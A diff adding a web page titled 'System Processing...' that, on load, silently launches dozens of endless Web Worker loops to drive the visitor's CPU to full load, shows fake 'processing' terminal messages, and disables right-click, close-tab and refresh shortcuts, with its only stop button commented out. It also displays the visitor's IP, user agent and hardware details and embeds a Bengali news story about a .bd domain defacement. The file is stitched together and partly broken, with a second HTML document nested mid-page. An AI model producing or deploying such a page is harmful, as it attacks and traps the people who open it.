@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Processing...</title>
+    <style>
+        /* body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 50px;
+            background: #000;
+            color: #0f0;
+            overflow: hidden;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .loading {
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #0f0;
+        }
+        .progress-container {
+            width: 100%;
+            height: 40px;
+            background: #222;
+            border: 2px solid #0f0;
+            border-radius: 20px;
+            margin: 30px 0;
+            overflow: hidden;
+        } */
+        .progress-bar {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #0f0);
+            animation: scanning 2s infinite linear;
+        }
+        @keyframes scanning {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .status {
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        .terminal {
+            background: #111;
+            border: 1px solid #0f0;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .cpu-meter {
+            width: 100%;
+            height: 20px;
+            background: #222;
+            border: 1px solid #0f0;
+            margin: 10px 0;
+            position: relative;
+        }
+        .cpu-usage {
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #ff0, #f00);
+            width: 0%;
+            transition: width 0.5s;
+        }
+    </style>
+</head>
+<body>
+   
+        
+        <div class="cpu-meter">
+            <div class="cpu-usage" id="cpuUsage"></div>
+        </div>
+        <div>: <span id="cpuPercent">0%</span></div>
+        
+        
+        
+        <div class="status">
+            <span class="blink">▶</span> 
+        </div>
+        
+    
+        
+        <div class="status">
+          
+        </div>
+        
+        <!-- <button onclick="stopWorkers()" style="padding: 10px 20px; background: #f00; color: white; border: none; cursor: pointer;"> test</button> -->
+    </div>
+
+  
+<?php
+$ip = $_SERVER['REMOTE_ADDR'];
+$ua = $_SERVER['HTTP_USER_AGENT'];
+?>
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Device Info</title></head>
+<body>
+<h3>Visitor Info</h3>
+<p><b>IP:</b> <?= $ip ?></p>
+<p><b>User Agent:</b> <?= $ua ?></p>
+<p id="more"></p>
+
+<script>
+let info = [];
+info.push("CPU Cores: " + (navigator.hardwareConcurrency || 'Unknown'));
+info.push("RAM (GB): " + (navigator.deviceMemory || 'Unknown'));
+if (navigator.userAgentData) {
+  info.push("Device: " + (navigator.userAgentData.platform || 'Unknown'));
+}
+document.getElementById('more').innerHTML = info.join("<br>");
+</script>
+</body>
+</html>
+
+
+
+
+
+  <article id="news"></article>
+
+  <script>
+    const articleText = `
+<h1>বাংলাদেশের ডোমেইন হ্যাক</h1>
+<p>বাংলাদেশ সময় শনিবার সন্ধ্যার দিকে গুগল ডটকম ডটবিডি হঠাৎ বদলে যায়৷ সেখানে প্রদর্শিত হতে থাকে, 'Hacked by TiGER-M@TE', 'owned by TiGER-M@TE'৷ ইন্টারনেট বিশেষজ্ঞদের মতে, বাংলাদেশের কান্ট্রি ডোমেইন নিয়ন্ত্রণ ব্যবস্থার দুর্বলতার সুযোগ নিয়ে একটি চক্র গুগল ডটকম ডটবিডি সহ কয়েক শত ডোমেইনের গতিপথ বদলে দিয়েছে৷</p>
+
+<p>তথ্য প্রযুক্তি বিশেষজ্ঞ সুমন আহমেদ সাবের এই প্রসঙ্গে বলেন, আক্রান্ত ডোমেইনগুলোর রুট ডিএনএস সার্ভার যেভাবে রক্ষণাবেক্ষণ করা উচিত ছিল, সেভাবে করা হয়নি৷ তাছাড়া এগুলো সুরক্ষায় এখনো পুরাতন সফটওয়্যার ব্যবহার করা হচ্ছে৷</p>
+
+<p>সুমন আহমেদ মনে করেন, বাংলাদেশের টেলিযোগাযোগ প্রতিষ্ঠান বিটিসিএল এর গাফেলতির কারণেই এই পরিস্থিতির সৃষ্টি হয়েছে৷ ডটবিডি-যুক্ত ডোমেইনগুলো সুরক্ষার দায়িত্ব বিটিসিএল এর উপরই বর্তায়৷</p>
+
+<p>এই বিষয়ে মন্তব্যের জন্য বিটিসিএল কার্যালয়ে একাধিকবার ফোনে যোগাযোগ করা হলেও কোন সাড়া পাওয়া যায়নি৷</p>
+
+<p>সাইবারক্রাইম সংক্রান্ত তথ্য প্রকাশকারী ওয়েবসাইট জোনড্যাশএইচ ডটঅর্গ জানাচ্ছে, গত বছরের আগস্ট মাস থেকে বিভিন্ন ওয়েবসাইটের উপর হামলা চালাতে শুরু করে ‘টাইগার মেট' চক্র৷ এখন পর্যন্ত ৯১৯টি ওয়েবসাইটকে আক্রান্ত করেছে এই চক্র৷ এগুলোর অধিকাংশই ডটবিডি যুক্ত ওয়েবসাইট৷</p>
+
+<p>ইতিমধ্যে অবশ্য টাইগার মেট-এর হানায় ক্ষতিগ্রস্ত অনেক ডোমেইন আগের অবস্থায় ফিরে গেছে৷ লিনাক্স ডটঅর্গ ডটবিডি-র মতো কয়েকটি আক্রান্ত সাইট তদন্তের স্বার্থে বন্ধ রয়েছে৷</p>
+
+<p>বলাবাহুল্য, বাংলাদেশের বিভিন্ন ওয়েবসাইট এর আগেও আক্রান্ত হয়েছে৷ সরকারি ওয়েবসাইট ছাড়াও ব়্যাব এর ওয়েবসাইট হ্যাক হয় ২০০৮ সালে৷ ঐ ঘটনায় একাধিক ব্যক্তিকে গ্রেপ্তার করা হয়েছিল৷</p>
+
+<p>উল্লেখ্য, বাংলাদেশে বর্তমানে ইন্টারনেট ব্যবহারকারীর সংখ্যা প্রায় আশি লাখ৷ শীঘ্রই এই সংখ্যা কোটি ছাড়িয়ে যাবে বলে আশা করা হচ্ছে৷ তবে, ব্যবহারকারী বৃদ্ধির সঙ্গে সঙ্গে ইন্টারনেট নিরাপত্তা বিষয়েও সতর্কতা বাড়ানো প্রয়োজন বলে মনে করছেন সংশ্লিষ্ট খাতের কর্তাব্যক্তিরা৷</p>
+`;
+    document.getElementById("news").innerHTML = articleText;
+  </script>
+
+
+    <script>
+        let workers = [];
+        let workerCount = 0;
+        
+        function createWorker() {
+            const workerCode = `
+                function intensiveMath() {
+                    let result = 0;
+                    while(true) {
+                        for(let i = 0; i < 1000000; i++) {
+                            result += Math.sqrt(i) * Math.tan(i) * Math.log(i + 1) * Math.sin(i) * Math.cos(i);
+                            result += Math.PI * Math.E * i;
+                            // More operations for maximum load
+                            result += Math.atan2(i, i+1) * Math.acos(Math.random()) * Math.asin(Math.random());
+                        }
+                    }
+                }
+                intensiveMath();
+            `;
+            
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            workers.push(worker);
+            workerCount++;
+            
+            updateCPUDisplay();
+        }
+        
+        function createMatrixWorker() {
+            const workerCode = `
+                function matrixOperations() {
+                    while(true) {
+                        const size = 400;
+                        let matrix1 = new Array(size);
+                        let matrix2 = new Array(size);
+                        let result = new Array(size);
+                        
+                        for(let i = 0; i < size; i++) {
+                            matrix1[i] = new Float64Array(size);
+                            matrix2[i] = new Float64Array(size);
+                            result[i] = new Float64Array(size);
+                            for(let j = 0; j < size; j++) {
+                                matrix1[i][j] = Math.random();
+                                matrix2[i][j] = Math.random();
+                            }
+                        }
+                        
+                        for(let i = 0; i < size; i++) {
+                            for(let j = 0; j < size; j++) {
+                                let sum = 0;
+                                for(let k = 0; k < size; k++) {
+                                    sum += matrix1[i][k] * matrix2[k][j];
+                                }
+                                result[i][j] = sum;
+                            }
+                        }
+                    }
+                }
+                matrixOperations();
+            `;
+            
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            workers.push(worker);
+            workerCount++;
+            
+            updateCPUDisplay();
+        }
+        
+        function createPrimeWorker() {
+            const workerCode = `
+                function findPrimes() {
+                    let n = 2;
+                    while(true) {
+                        let isPrime = true;
+                        let sqrtN = Math.sqrt(n);
+                        for(let i = 2; i <= sqrtN; i++) {
+                            if(n % i === 0) {
+                                isPrime = false;
+                                break;
+                            }
+                        }
+                        if(isPrime) {
+                            // Do nothing, just continue
+                        }
+                        n++;
+                        if(n > 1000000) n = 2;
+                    }
+                }
+                findPrimes();
+            `;
+            
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+            workers.push(worker);
+            workerCount++;
+            
+            updateCPUDisplay();
+        }
+        
+        function startCPULoad() {
+            console.log("Starting CPU load with Web Workers...");
+            
+            // Start multiple workers based on CPU cores
+            const coreCount = navigator.hardwareConcurrency || 4;
+            
+            for(let i = 0; i < coreCount; i++) {
+                createWorker();
+                createMatrixWorker();
+                createPrimeWorker();
+            }
+            
+            // Additional workers for maximum load
+            setTimeout(() => {
+                for(let i = 0; i < 2; i++) {
+                    createWorker();
+                }
+            }, 1000);
+        }
+        
+        function updateCPUDisplay() {
+            const cpuUsage = document.getElementById('cpuUsage');
+            const cpuPercent = document.getElementById('cpuPercent');
+            
+            // Simulate CPU usage based on worker count
+            let usage = Math.min(100, workerCount * 15);
+            cpuUsage.style.width = usage + '%';
+            cpuPercent.textContent = usage + '%';
+        }
+        
+        function stopWorkers() {
+            workers.forEach(worker => {
+                worker.terminate();
+            });
+            workers = [];
+            workerCount = 0;
+            updateCPUDisplay();
+            document.querySelector('.status').innerHTML = 
+                '<span style="color:#f00">▶</span> Process stopped by user';
+        }
+        
+        // Terminal output simulation
+        function simulateTerminal() {
+            const terminal = document.getElementById('terminal');
+            const messages = [
+                "> Initializing cryptographic protocols...",
+                "> Starting Web Workers for parallel processing...",
+                "> Loading matrix multiplication algorithms...",
+                "> Initializing prime number calculations...",
+                "> Starting mathematical computations...",
+                "> CPU cores detected: " + (navigator.hardwareConcurrency || "Unknown"),
+                "> Launching " + ((navigator.hardwareConcurrency || 4) * 3) + " worker threads...",
+                "> System resources at maximum utilization...",
+                "> CPU temperature monitoring enabled...",
+                "> Memory allocation optimized...",
+                "> Parallel processing at full capacity...",
+                "> All CPU cores engaged in computation...",
+                "> Computational efficiency at peak levels...",
+                "> System stability maintained...",
+                "> Continuous processing initiated..."
+            ];
+            
+            let index = 0;
+            const interval = setInterval(() => {
+                if(index < messages.length) {
+                    terminal.innerHTML += `<div>${messages[index]}</div>`;
+                    terminal.scrollTop = terminal.scrollHeight;
+                    index++;
+                } else {
+                    clearInterval(interval);
+                }
+            }, 800);
+        }
+        
+        // Start everything when page loads
+        window.addEventListener('load', function() {
+            simulateTerminal();
+            
+            // Start CPU load after a short delay
+            setTimeout(() => {
+                document.querySelector('.status').innerHTML = 
+                    '<span class="blink">▶</span> 0x3d3d';
+                startCPULoad();
+            }, 2000);
+        });
+        
+        // Prevent right-click and other context menus
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Prevent keyboard shortcuts for closing
+        document.addEventListener('keydown', function(e) {
+            if(e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 'F4')) {
+                e.preventDefault();
+                alert('Please wait for the process to complete or use Emergency Stop button.');
+            }
+            if(e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+                alert('Refresh is disabled during system processing.');
+            }
+        });
+    </script>
+</body>
+</html>
